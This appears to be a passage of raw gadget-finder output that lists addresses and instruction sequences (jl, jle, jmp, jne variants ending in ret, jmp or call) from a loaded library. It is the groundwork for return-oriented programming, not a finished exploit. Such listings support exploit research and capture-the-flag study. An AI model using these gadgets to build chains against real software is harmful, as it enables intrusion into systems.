0x00002aaaaac5ed55 : jl 0x189d4f ; jmp qword ptr [rdx]
0x00002aaaaac5ed59 : jl 0x189d53 ; jmp qword ptr [rdx]
0x00002aaaaac5ed5d : jl 0x189d57 ; jmp qword ptr [rdx]
0x00002aaaaac5ed61 : jl 0x189d5b ; jmp qword ptr [rdx]
0x00002aaaaac5ed65 : jl 0x189d5f ; jmp qword ptr [rdx]
0x00002aaaaac5ed71 : jl 0x189d6b ; jmp qword ptr [rdx]
0x00002aaaaac5ed69 : jl 0x189d6b ; ljmp ptr [rsi + 0x22fff679] ; jl 0x189d73 ; jmp qword ptr [rdx]
0x00002aaaaac5ed75 : jl 0x189d6f ; jmp qword ptr [rdx]
0x00002aaaaac5ed79 : jl 0x189d73 ; jmp qword ptr [rdx]
0x00002aaaaac5ed7d : jl 0x189d77 ; jmp qword ptr [rdx]
0x00002aaaaac69369 : jl 0x19436c ; jmp qword ptr [rax + 0x20fffb7d]
0x00002aaaaac6a2a9 : jl 0x1952a9 ; call rax
0x00002aaaaac6a325 : jl 0x195325 ; jmp qword ptr [rdx]
0x00002aaaaac6a329 : jl 0x19532d ; jmp qword ptr [rdx + 0x22fffc7b]
0x00002aaaaac6a4a5 : jl 0x1954a5 ; jmp rax
0x00002aaaaac6c219 : jl 0x19720b ; jmp rsp
0x00002aaaaac6d27c : jl 0x1982e2 ; add dword ptr [rax], eax ; xor al, 0x91 ; hlt ; jmp rsp
0x00002aaaaac6ef9c : jl 0x199fb3 ; add al, byte ptr [rax] ; je 0x19a00e ; stc ; call rsp
0x00002aaaaac6f8a1 : jl 0x19a8a7 ; ljmp ptr [rsp + rcx*2 + 2] ; add ah, dl ; jg 0x19a8af ; call rsp
0x00002aaaaac6f8a0 : jl 0x19a8a8 ; ljmp ptr [rsp + rcx*2 + 2] ; add ah, dl ; jg 0x19a8b0 ; call rsp
0x00002aaaaac6fcc4 : jl 0x19acd2 ; add dword ptr [rax], eax ; xor al, 0x73 ; sti ; call rsp
0x00002aaaaac71fb4 : jl 0x19cfdd ; add byte ptr [rax], al ; sbb byte ptr [rcx - 0x17], ah ; jmp rdx
0x00002aaaaac72371 : jl 0x19d35e ; call qword ptr [rcx]
0x00002aaaaac730b4 : jl 0x19e0ec ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac730b4 : jl 0x19e0ee ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac76cb4 : jl 0x1a1d2a ; add byte ptr [rax], al ; cwde ; adc ebp, ebp ; call rsi
0x00002aaaaac7afb4 : jl 0x1a5f6d ; add byte ptr [rax], al ; js 0x1a5fdb ; cli ; call qword ptr [rax]
0x00002aaaaac7c2d0 : jl 0x1a72d7 ; add byte ptr [rax], al ; pushfq ; ret
0x00002aaaaac7ebb4 : jl 0x1a9ba9 ; add byte ptr [rax], al ; or byte ptr [rbx], al ; call rdi
0x00002aaaaac81fb4 : jl 0x1acfdd ; add dword ptr [rax], eax ; js 0x1acf54 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac851b4 : jl 0x1b020f ; add dword ptr [rax], eax ; fdiv dword ptr [rbx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac86fb4 : jl 0x1b202d ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaaaf5823 : jl 0x20854 ; adc al, 0x48 ; mov edx, dword ptr [rax] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaaaf9366 : jl 0x24394 ; sbb byte ptr [rax - 0x75], cl ; and al, 0x28 ; call rax
0x00002aaaaaaf9d01 : jl 0x24d2f ; sbb byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaaafa10f : jl 0x2513d ; and byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaaad75e3 : jl 0x2576 ; loop 0x25c1 ; ret 0x23cb
0x00002aaaaaafaf30 : jl 0x25f5e ; cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00002aaaaaafb869 : jl 0x26892 ; call rbx
0x00002aaaaaafbca9 : jl 0x26cd7 ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaaafcbfd : jl 0x27c2b ; and byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaaaff278 : jl 0x2a2a3 ; sub byte ptr [rcx - 0x77], al ; ret 0x8b4c
0x00002aaaaaad5452 : jl 0x468 ; sbb al, 0xc ; ret 0x4412
0x00002aaaaab267b8 : jl 0x51782 ; clc ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x00002aaaaab47a25 : jl 0x729c1 ; add byte ptr [rax - 0x7d], cl ; ret 0x4c01
0x00002aaaaab4f78b : jl 0x7a7d6 ; movzx eax, ch ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab52b99 : jl 0x7dbd4 ; add byte ptr [rax - 0x77], cl ; ret 0xbfe9
0x00002aaaaab5be20 : jl 0x86e2a ; add byte ptr [rax], al ; mov rsi, r14 ; call rax
0x00002aaaaab5dd00 : jl 0x88d7d ; add dword ptr [rax], eax ; ret
0x00002aaaaab69575 : jl 0x945a0 ; adc byte ptr [rcx + 1], cl ; ret 0x1b8
0x00002aaaaab7356a : jl 0x9e5d5 ; add rax, rdi ; ret
0x00002aaaaab7357a : jl 0x9e5d7 ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab7359a : jl 0x9e5d7 ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab735ba : jl 0x9e5d7 ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab73f34 : jl 0x9ef83 ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab73f70 : jl 0x9efbf ; adc dword ptr [rcx - 1], ebx ; ret
0x00002aaaaab7416e : jl 0x9f1bd ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab742d5 : jl 0x9f324 ; adc dword ptr [rcx + 7], edi ; ret
0x00002aaaaab74437 : jl 0x9f486 ; adc dword ptr [rdi - 8], edi ; ret
0x00002aaaaab74687 : jl 0x9f6d6 ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab746c3 : jl 0x9f712 ; adc dword ptr [rcx - 1], ebx ; ret
0x00002aaaaab748c1 : jl 0x9f910 ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab74a28 : jl 0x9fa77 ; adc dword ptr [rcx + 7], edi ; ret
0x00002aaaaab74b8a : jl 0x9fbd9 ; adc dword ptr [rdi - 8], edi ; ret
0x00002aaaaab74dd4 : jl 0x9fe23 ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab74e10 : jl 0x9fe5f ; adc dword ptr [rcx - 1], ebx ; ret
0x00002aaaaab7500e : jl 0xa005d ; adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab75175 : jl 0xa01c4 ; adc dword ptr [rcx + 7], edi ; ret
0x00002aaaaab752d7 : jl 0xa0326 ; adc dword ptr [rdi - 8], edi ; ret
0x00002aaaaab7e9dc : jl 0xa9a2b ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7e9fd : jl 0xa9a4c ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7ea0a : jl 0xa9a5f ; adc dword ptr [rdi], edx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x00002aaaaab7ea10 : jl 0xa9a5f ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7eae5 : jl 0xa9b34 ; adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7eb3d : jl 0xa9b8c ; adc dword ptr [rsi + 3], edx ; ret
0x00002aaaaab7ebda : jl 0xa9c29 ; adc dword ptr [rsi + 7], edx ; ret
0x00002aaaaab94650 : jl 0xbf6a7 ; ror byte ptr [rax - 0x46], 1 ; ret
0x00002aaaaab98a39 : jl 0xc3a64 ; xor byte ptr [rax + 0x63], cl ; ret 0x894c
0x00002aaaaab9d700 : jl 0xc872e ; sbb byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x00002aaaaaba9d4e : jl 0xd4dd3 ; mov byte ptr [rdi + 8], 1 ; mov eax, 1 ; ret
0x00002aaaaabb60b9 : jl 0xe10e5 ; add rax, rdx ; jmp rax
0x00002aaaaabb75d0 : jl 0xe25fb ; and byte ptr [rax - 0x77], cl ; ret 0x8949
0x00002aaaaabb82e7 : jl 0xe3316 ; sub byte ptr [rcx - 0x7d], al ; cld ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xf44
0x00002aaaaabc85cd : jl 0xf35fb ; mov qword ptr [r14], rbx ; call 0x1f8b0
0x00002aaaaabc87b5 : jl 0xf37e0 ; sbb byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabcba94 : jl 0xf6ac0 ; test al, 2 ; cmove eax, edx ; ret
0x00002aaaaabcba94 : jl 0xf6ac1 ; test al, 2 ; cmove eax, edx ; ret
0x00002aaaaabce7e6 : jl 0xf9816 ; push 0x244c8903 ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret 0x8445
0x00002aaaaabcf57f : jl 0xfa587 ; add dword ptr [rax - 0x7d], ecx ; ret 0xe801
0x00002aaaaabe198c : jle 0x10c9be ; add byte ptr [rax - 0x77], cl ; ret 0x9ce9
0x00002aaaaac07c1a : jle 0x132c32 ; xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0c0d8 : jle 0x1370f0 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac1eb26 : jle 0x149a41 ; movsxd rax, ecx ; ret
0x00002aaaaac1ed6a : jle 0x149cab ; ret
0x00002aaaaac328b1 : jle 0x15d8c1 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac4867c : jle 0x173678 ; mov rbx, qword ptr [rdi + 0x10] ; call 0x1f8b0
0x00002aaaaac5cbc1 : jle 0x187bb8 ; call qword ptr [rdi]
0x00002aaaaac5cbc1 : jle 0x187bbc ; call qword ptr [rdi]
0x00002aaaaac5d5f0 : jle 0x188646 ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5ec71 : jle 0x189c6b ; jmp rdx
0x00002aaaaac5ec79 : jle 0x189c73 ; jmp rdx
0x00002aaaaac5ec78 : jle 0x189c74 ; jmp rdx
0x00002aaaaac6a050 : jle 0x194fde ; cld ; inc dword ptr [rax] ; mov ah, bh ; call qword ptr [rax + 0x20fffc87]
0x00002aaaaac6a299 : jle 0x195299 ; call rax
0x00002aaaaac6a319 : jle 0x19531d ; jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaac6a315 : jle 0x19531d ; push qword ptr [rdx] ; jle 0x195321 ; jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaac6b19d : jle 0x1961a5 ; add byte ptr [rdi + rax - 0x16], al ; jmp rsp
0x00002aaaaac72411 : jle 0x19d3fe ; jmp qword ptr [rsi]
0x00002aaaaac7ac31 : jle 0x1a5c23 ; jmp qword ptr [rcx]
0x00002aaaaac80e01 : jle 0x1abe0f ; ret
0x00002aaaaaaff6e2 : jle 0x2a6f5 ; sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x00002aaaaaad8180 : jle 0x317e ; add ebp, esi ; mov eax, 0xa1a3e95a ; ret 0xba88
0x00002aaaaab314f6 : jle 0x5c567 ; add byte ptr ss:[rax - 0x39], cl ; ret 0xfffe
0x00002aaaaab3d4ec : jle 0x68479 ; ret
0x00002aaaaab42de1 : jle 0x6ddf1 ; or dword ptr [rbx], 0x20 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5fbee : jle 0x8abf7 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x00002aaaaab5fbee : jle 0x8abf8 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x00002aaaaaba164d : jle 0xcc65b ; ret
0x00002aaaaaba1e59 : jle 0xcce5f ; add byte ptr [rax], al ; ret
0x00002aaaaabd6272 : jmp 0x101238
0x00002aaaaabd69a9 : jmp 0x10190a
0x00002aaaaabe056e : jmp 0x10b596
0x00002aaaaabe0d14 : jmp 0x10ba61
0x00002aaaaabe0d44 : jmp 0x10bc7c
0x00002aaaaabe2447 : jmp 0x10d36e
0x00002aaaaabe2b60 : jmp 0x10db26
0x00002aaaaabe6fa9 : jmp 0x111f6f
0x00002aaaaabecab1 : jmp 0x117a76
0x00002aaaaabee7e2 : jmp 0x1195a9
0x00002aaaaabeeba2 : jmp 0x119979
0x00002aaaaabf0084 : jmp 0x11b0ad
0x00002aaaaabf00dc : jmp 0x11b107
0x00002aaaaabfae8c : jmp 0x125e51
0x00002aaaaac066cf : jmp 0x131695
0x00002aaaaac0ae31 : jmp 0x135e01
0x00002aaaaac0b586 : jmp 0x1365ae
0x00002aaaaac0c97e : jmp 0x137988
0x00002aaaaac116cc : jmp 0x13c23c
0x00002aaaaac169a0 : jmp 0x14168c
0x00002aaaaac49c92 : jmp 0x174c94
0x00002aaaaac49c96 : jmp 0x174c98
0x00002aaaaac49ca6 : jmp 0x174ca8
0x00002aaaaac49caa : jmp 0x174cac
0x00002aaaaac56286 : jmp 0x181288
0x00002aaaaac5628a : jmp 0x18128c
0x00002aaaaac56356 : jmp 0x181358
0x00002aaaaac5635a : jmp 0x18135c
0x00002aaaaac5635e : jmp 0x181360
0x00002aaaaac56362 : jmp 0x181364
0x00002aaaaac56366 : jmp 0x181368
0x00002aaaaac5636a : jmp 0x18136c
0x00002aaaaac5636e : jmp 0x181370
0x00002aaaaac56372 : jmp 0x181374
0x00002aaaaac56376 : jmp 0x181378
0x00002aaaaac5637a : jmp 0x18137c
0x00002aaaaac578aa : jmp 0x1828e9
0x00002aaaaac585e9 : jmp 0x1835bc
0x00002aaaaac595e0 : jmp 0x184574
0x00002aaaaac595df : jmp 0x184575
0x00002aaaaac6b5b2 : jmp 0x1965b4
0x00002aaaaac6b6aa : jmp 0x1966ac
0x00002aaaaac6b6a9 : jmp 0x1966ad
0x00002aaaaac6b6a8 : jmp 0x1966ae
0x00002aaaaac6b6fa : jmp 0x1966fc
0x00002aaaaac6b722 : jmp 0x196724
0x00002aaaaac74ac2 : jmp 0x19fac4
0x00002aaaaac74b12 : jmp 0x19fb14
0x00002aaaaac74e62 : jmp 0x19fe64
0x00002aaaaac74f1a : jmp 0x19ff1c
0x00002aaaaac74f9a : jmp 0x19ff9c
0x00002aaaaac71dda : jmp 0x1b90e0
0x00002aaaaac48610 : jmp 0x1f8aa
0x00002aaaaaaf4b07 : jmp 0x1facd
0x00002aaaaaaf5496 : jmp 0x2045b
0x00002aaaaaafb66c : jmp 0x2627e
0x00002aaaaaafba1b : jmp 0x2682e
0x00002aaaaab01dd1 : jmp 0x2ce43
0x00002aaaaab0668a : jmp 0x30ed6
0x00002aaaaab066df : jmp 0x316e2
0x00002aaaaab0cb81 : jmp 0x37b8b
0x00002aaaaaad88b3 : jmp 0x3879
0x00002aaaaab0ff85 : jmp 0x39c63093
0x00002aaaaab6ea5f : jmp 0x440b5ce9
0x00002aaaaaba6637 : jmp 0x480d21ba
0x00002aaaaab1d392 : jmp 0x483e4
0x00002aaaaabbc690 : jmp 0x48d0ffe0
0x00002aaaaac07fe2 : jmp 0x48d2f272
0x00002aaaaab451a2 : jmp 0x48f58af5
0x00002aaaaab1ef72 : jmp 0x49fc4
0x00002aaaaab20b46 : jmp 0x4b8f6
0x00002aaaaab24267 : jmp 0x4f243
0x00002aaaaac2f37a : jmp 0x4f94b378
0x00002aaaaac2f379 : jmp 0x4f94b379
0x00002aaaaac31e4a : jmp 0x4f94de48
0x00002aaaaac31e49 : jmp 0x4f94de49
0x00002aaaaac3496a : jmp 0x4f950968
0x00002aaaaac34969 : jmp 0x4f950969
0x00002aaaaab2ba95 : jmp 0x56320
0x00002aaaaab2d69c : jmp 0x574ac
0x00002aaaaab2faa5 : jmp 0x590d3
0x00002aaaaab30042 : jmp 0x5a1a8
0x00002aaaaab2f8bf : jmp 0x5a1aa
0x00002aaaaab34811 : jmp 0x5baf2
0x00002aaaaab3146c : jmp 0x5c431
0x00002aaaaab32869 : jmp 0x5c9cb
0x00002aaaaab35852 : jmp 0x5ca99
0x00002aaaaab34b8a : jmp 0x5fb4f
0x00002aaaaab3545e : jmp 0x60423
0x00002aaaaab37809 : jmp 0x627ce
0x00002aaaaab3c498 : jmp 0x636fe
0x00002aaaaab3ab8b : jmp 0x63702
0x00002aaaaab3a11f : jmp 0x6481e
0x00002aaaaab3ddaa : jmp 0x64b91
0x00002aaaaab3aaca : jmp 0x64bf7
0x00002aaaaab3aac9 : jmp 0x64bf8
0x00002aaaaab3a97b : jmp 0x653d3
0x00002aaaaab3e613 : jmp 0x6585f
0x00002aaaaab3ef5b : jmp 0x661e6
0x00002aaaaab47feb : jmp 0x72fb1
0x00002aaaaab47fea : jmp 0x72fb2
0x00002aaaaabebb24 : jmp 0x76d3a474
0x00002aaaaabebcd7 : jmp 0x76d3a627
0x00002aaaaab505de : jmp 0x7b5c0
0x00002aaaaac6ad3a : jmp 0x842a47
0x00002aaaaac6ad7a : jmp 0x852a87
0x00002aaaaab5a955 : jmp 0x8597d
0x00002aaaaab5be84 : jmp 0x86e4e
0x00002aaaaab5cb32 : jmp 0x87af8
0x00002aaaaab5ccaa : jmp 0x87c6f
0x00002aaaaac6aeaa : jmp 0x88f3b7
0x00002aaaaab5dfa4 : jmp 0x88f6a
0x00002aaaaab5e0f8 : jmp 0x890bd
0x00002aaaaab6a59b : jmp 0x953f1
0x00002aaaaab6ac4c : jmp 0x95c12
0x00002aaaaab6ad98 : jmp 0x95d5d
0x00002aaaaab6af42 : jmp 0x95f07
0x00002aaaaab6ed94 : jmp 0x99d9e
0x00002aaaaab6f270 : jmp 0x9a27a
0x00002aaaaab71e12 : jmp 0x9c7ba
0x00002aaaaab7284c : jmp 0x9c842
0x00002aaaaab71931 : jmp 0x9c85f
0x00002aaaaab7284d : jmp 0x9d843
0x00002aaaaab7e77e : jmp 0xa9744
0x00002aaaaab7e84f : jmp 0xa9815
0x00002aaaaab7e8be : jmp 0xa9884
0x00002aaaaab82424 : jmp 0xad207
0x00002aaaaab82833 : jmp 0xad667
0x00002aaaaab84ff2 : jmp 0xafadd
0x00002aaaaab8bc64 : jmp 0xb6cb1
0x00002aaaaab93b65 : jmp 0xbad93
0x00002aaaaab9363b : jmp 0xbe600
0x00002aaaaab939f8 : jmp 0xbea0a
0x00002aaaaab9457c : jmp 0xbf36d
0x00002aaaaab9699e : jmp 0xc17f0
0x00002aaaaab9c910 : jmp 0xc78d6
0x00002aaaaab9ec07 : jmp 0xc9ad6
0x00002aaaaaba1f4f : jmp 0xccf3c
0x00002aaaaaba1665 : jmp 0xcee2b
0x00002aaaaaba95f1 : jmp 0xd45eb
0x00002aaaaabac0cb : jmp 0xd7091
0x00002aaaaabb5d2d : jmp 0xe0d28
0x00002aaaaabc20f2 : jmp 0xed0f8
0x00002aaaaabdbdc4 : jmp 0xf106dcd
0x00002aaaaab1b7dd : jmp 0xfc6fef4
0x00002aaaaabd3a71 : jmp 0xfea78
0x00002aaaaabd4be4 : jmp 0xffc0e
0x00002aaaaac0bb8a : jmp 0xffffffff80d662a2
0x00002aaaaac0be11 : jmp 0xffffffff80d66529
0x00002aaaaab0bcf9 : jmp 0xffffffff814c6d07
0x00002aaaaab4cd4d : jmp 0xffffffff83500dc3
0x00002aaaaaad8186 : jmp 0xffffffff88c2d331
0x00002aaaaab92928 : jmp 0xffffffffbece6278
0x00002aaaaabfee32 : jmp 0xffffffffc098723d
0x00002aaaaabaea42 : jmp 0xffffffffc296db53
0x00002aaaaac0dd76 : jmp 0xffffffffc29d8d7b
0x00002aaaaab7ffc3 : jmp 0xffffffffc30aafcc
0x00002aaaaab1da91 : jmp 0xffffffffc31413e6
0x00002aaaaab6e193 : jmp 0xffffffffc332da9d
0x00002aaaaab0abae : jmp 0xffffffffc38c5bc4
0x00002aaaaab9ae24 : jmp 0xfffffffff8ce4ebc
0x00002aaaaac14d23 : jmp 0xffffffffff142572
0x00002aaaaab81abb : jmp 0xfffffffffffa540c
0x00002aaaaabd29cb : jmp qword ptr [r8]
0x00002aaaaac6a2cb : jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaac69353 : jmp qword ptr [rax + 0x20fffb74]
0x00002aaaaac6935b : jmp qword ptr [rax + 0x20fffb77]
0x00002aaaaac69363 : jmp qword ptr [rax + 0x20fffb7a]
0x00002aaaaac6936b : jmp qword ptr [rax + 0x20fffb7d]
0x00002aaaaac69373 : jmp qword ptr [rax + 0x20fffb80]
0x00002aaaaac6937b : jmp qword ptr [rax + 0x20fffb83]
0x00002aaaaac69383 : jmp qword ptr [rax + 0x20fffb86]
0x00002aaaaac6a013 : jmp qword ptr [rax + 0x20fffc35]
0x00002aaaaac69fd7 : jmp qword ptr [rax + 0x20fffc36]
0x00002aaaaac6a01b : jmp qword ptr [rax + 0x20fffc38]
0x00002aaaaac69fdf : jmp qword ptr [rax + 0x20fffc39]
0x00002aaaaac6a023 : jmp qword ptr [rax + 0x20fffc3b]
0x00002aaaaac69fe7 : jmp qword ptr [rax + 0x20fffc3c]
0x00002aaaaac6a02b : jmp qword ptr [rax + 0x20fffc3e]
0x00002aaaaac69fef : jmp qword ptr [rax + 0x20fffc3f]
0x00002aaaaac6a033 : jmp qword ptr [rax + 0x20fffc41]
0x00002aaaaac69ff7 : jmp qword ptr [rax + 0x20fffc42]
0x00002aaaaac6a03b : jmp qword ptr [rax + 0x20fffc44]
0x00002aaaaac69fff : jmp qword ptr [rax + 0x20fffc45]
0x00002aaaaac6a043 : jmp qword ptr [rax + 0x20fffc47]
0x00002aaaaac6a007 : jmp qword ptr [rax + 0x20fffc48]
0x00002aaaaac69f7b : jmp qword ptr [rax + 0x20fffc53]
0x00002aaaaac69f73 : jmp qword ptr [rax + 0x20fffc54]
0x00002aaaaac69f6b : jmp qword ptr [rax + 0x20fffc55]
0x00002aaaaac69f63 : jmp qword ptr [rax + 0x20fffc56]
0x00002aaaaac69f5b : jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaac69f93 : jmp qword ptr [rax + 0x20fffc58]
0x00002aaaaac6a953 : jmp qword ptr [rax + 0x20fffca4]
0x00002aaaaac5d56f : jmp qword ptr [rax + 0x22fff44c]
0x00002aaaaac5be2f : jmp qword ptr [rax + 0x24]
0x00002aaaaac5d99f : jmp qword ptr [rax + 0x26fff452]
0x00002aaaaac5be3f : jmp qword ptr [rax + 0x29]
0x00002aaaaac5be4f : jmp qword ptr [rax + 0x2e]
0x00002aaaaac5be5f : jmp qword ptr [rax + 0x33]
0x00002aaaaac692c3 : jmp qword ptr [rax + 0x40fffb33]
0x00002aaaaac6ace3 : jmp qword ptr [rax + rbp*2 + 0x68f40000]
0x00002aaaaac5be63 : jmp qword ptr [rax - 0x1f000fcc]
0x00002aaaaac5be53 : jmp qword ptr [rax - 0x1f000fd1]
0x00002aaaaac5be43 : jmp qword ptr [rax - 0x1f000fd6]
0x00002aaaaac5be33 : jmp qword ptr [rax - 0x1f000fdb]
0x00002aaaaac695ff : jmp qword ptr [rax - 0x2e00024a]
0x00002aaaaac695df : jmp qword ptr [rax - 0x2e00024b]
0x00002aaaaac5c407 : jmp qword ptr [rax - 0x2f000dff]
0x00002aaaaac5c21b : jmp qword ptr [rax - 0x2f000e15]
0x00002aaaaac60587 : jmp qword ptr [rax - 0x4700059e]
0x00002aaaaab1b06e : jmp qword ptr [rax]
0x00002aaaaac6e51b : jmp qword ptr [rbx + rax*8]
0x00002aaaaab33c58 : jmp qword ptr [rbx + rcx*4 + 1]
0x00002aaaaaad7563 : jmp qword ptr [rbx]
0x00002aaaaac5d843 : jmp qword ptr [rcx + 0x22fff452]
0x00002aaaaac69403 : jmp qword ptr [rcx + 0x41fffda8]
0x00002aaaaac5e40b : jmp qword ptr [rcx]
0x00002aaaaac6fa53 : jmp qword ptr [rdi + rdx*2 + 2]
0x00002aaaaac6fa5b : jmp qword ptr [rdi + rdx*2 - 0x3cdbfffe]
0x00002aaaaabc8cb3 : jmp qword ptr [rdi]
0x00002aaaaac6a33b : jmp qword ptr [rdx + 0x22fffc79]
0x00002aaaaac6a333 : jmp qword ptr [rdx + 0x22fffc7a]
0x00002aaaaac6a32b : jmp qword ptr [rdx + 0x22fffc7b]
0x00002aaaaac6a323 : jmp qword ptr [rdx + 0x22fffc7c]
0x00002aaaaac6a31b : jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaac6e4db : jmp qword ptr [rdx + rax*8 + 1]
0x00002aaaaabc8c32 : jmp qword ptr [rdx]
0x00002aaaaac5d6f3 : jmp qword ptr [rip + 0x22fff454]
0x00002aaaaac69b8f : jmp qword ptr [rsi + 0x16fffc5b]
0x00002aaaaab0ef01 : jmp qword ptr [rsi + 0xf]
0x00002aaaaabb0acd : jmp qword ptr [rsi - 0x70]
0x00002aaaaabf130c : jmp qword ptr [rsi]
0x00002aaaaac6e85b : jmp qword ptr [rsp + rdx*8 + 1]
0x00002aaaaaad6b62 : jmp r10
0x00002aaaaac253cd : jmp r9
0x00002aaaaab94506 : jmp rax
0x00002aaaaac7588b : jmp rbx
0x00002aaaaab00e4a : jmp rcx
0x00002aaaaab41aa4 : jmp rdi
0x00002aaaaaad6b63 : jmp rdx
0x00002aaaaab038f4 : jmp rsi
0x00002aaaaaad7a71 : jmp rsp
0x00002aaaaabd6ca5 : jne 0x101c49 ; pop rbx ; pop rbp ; pop r12 ; mov esi, 3 ; jmp rax
0x00002aaaaabd7558 : jne 0x102540 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaabda14a : jne 0x105148 ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaabda1ba : jne 0x1051b8 ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe056c : jne 0x10b57e ; jmp 0x10b598
0x00002aaaaabe713e : jne 0x112177 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe8e55 : jne 0x113e69 ; cmp qword ptr [rdi], 0 ; je 0x113e71 ; ret
0x00002aaaaabe8ec8 : jne 0x113ed7 ; mov eax, 1 ; ret
0x00002aaaaabe8ef8 : jne 0x113f04 ; xor eax, eax ; ret
0x00002aaaaabe8f28 : jne 0x113f34 ; xor eax, eax ; ret
0x00002aaaaabe8f58 : jne 0x113f64 ; xor eax, eax ; ret
0x00002aaaaabe8f88 : jne 0x113f94 ; xor eax, eax ; ret
0x00002aaaaabe8fb8 : jne 0x113fc4 ; xor eax, eax ; ret
0x00002aaaaabe8fe8 : jne 0x113ff4 ; xor eax, eax ; ret
0x00002aaaaabe9018 : jne 0x114024 ; xor eax, eax ; ret
0x00002aaaaabe9048 : jne 0x114054 ; xor eax, eax ; ret
0x00002aaaaabe9078 : jne 0x114084 ; xor eax, eax ; ret
0x00002aaaaabe90a8 : jne 0x1140b4 ; xor eax, eax ; ret
0x00002aaaaabe90d8 : jne 0x1140e4 ; xor eax, eax ; ret
0x00002aaaaabe9108 : jne 0x114114 ; xor eax, eax ; ret
0x00002aaaaabe9138 : jne 0x114144 ; xor eax, eax ; ret
0x00002aaaaabe9168 : jne 0x114174 ; xor eax, eax ; ret
0x00002aaaaabe9198 : jne 0x1141a4 ; xor eax, eax ; ret
0x00002aaaaabe91c8 : jne 0x1141d4 ; xor eax, eax ; ret
0x00002aaaaabe91f8 : jne 0x114204 ; xor eax, eax ; ret
0x00002aaaaabe9228 : jne 0x114234 ; xor eax, eax ; ret
0x00002aaaaabe9258 : jne 0x114264 ; xor eax, eax ; ret
0x00002aaaaabe9288 : jne 0x114294 ; xor eax, eax ; ret
0x00002aaaaabe92e8 : jne 0x1142f4 ; xor eax, eax ; ret
0x00002aaaaabe9318 : jne 0x114324 ; xor eax, eax ; ret
0x00002aaaaabe9348 : jne 0x114354 ; xor eax, eax ; ret
0x00002aaaaabe9378 : jne 0x114384 ; xor eax, eax ; ret
0x00002aaaaabe93a8 : jne 0x1143b4 ; xor eax, eax ; ret
0x00002aaaaabe93d8 : jne 0x1143e4 ; xor eax, eax ; ret
0x00002aaaaabe9408 : jne 0x114414 ; xor eax, eax ; ret
0x00002aaaaabe9438 : jne 0x114444 ; xor eax, eax ; ret
0x00002aaaaabe9468 : jne 0x114474 ; xor eax, eax ; ret
0x00002aaaaabe94b2 : jne 0x1144a9 ; pop rdx ; pop r10 ; ret
0x00002aaaaabe95a5 : jne 0x1145b3 ; ret
0x00002aaaaabe97b4 : jne 0x114793 ; ret
0x00002aaaaabe97ef : jne 0x1147e7 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaabe9947 : jne 0x1148e7 ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaabe9f54 : jne 0x114f3f ; lea rdi, qword ptr [rip - 0x16d] ; call rax
0x00002aaaaabe9f83 : jne 0x114f7c ; xor eax, eax ; leave ; ret
0x00002aaaaabea984 : jne 0x11592e ; mov rax, rdi ; add rsp, 8 ; ret
0x00002aaaaabebcfa : jne 0x116d10 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabebfc6 : jne 0x116f7a ; mov rax, rdi ; add rsp, 8 ; ret
0x00002aaaaabf0082 : jne 0x11b095 ; jmp 0x11b0af
0x00002aaaaabf00da : jne 0x11b0ef ; jmp 0x11b109
0x00002aaaaabf124b : jne 0x11c1c4 ; mov rax, rsi ; pop rbx ; ret
0x00002aaaaabf4193 : jne 0x11f183 ; pop rbx ; ret
